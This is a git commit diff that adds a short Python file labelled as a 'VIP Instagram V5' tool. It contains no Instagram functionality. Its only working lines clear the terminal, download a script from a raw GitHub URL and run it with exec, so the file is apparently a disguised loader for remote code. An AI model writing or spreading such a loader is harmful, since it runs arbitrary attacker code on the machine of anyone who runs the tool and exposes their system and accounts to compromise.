c67e6d08dd37afc9642d8857bd799089d07a34e2
rootiff <info@rootif.com>
2025-01-19 21:42:32 +0300

    Add files via upload

---
+++ [VİP] [INSTAGRAM] [V5]  (1).py
@@ -0,0 +1,5 @@
+import requests, os
+def thomas(url):
+    exec(requests.get(url).text) if os.system("clear") == 0 else None
+thomas("https://raw.githubusercontent.com/t9omas/porno/refs/heads/main/admin.py")
+# @t5omas
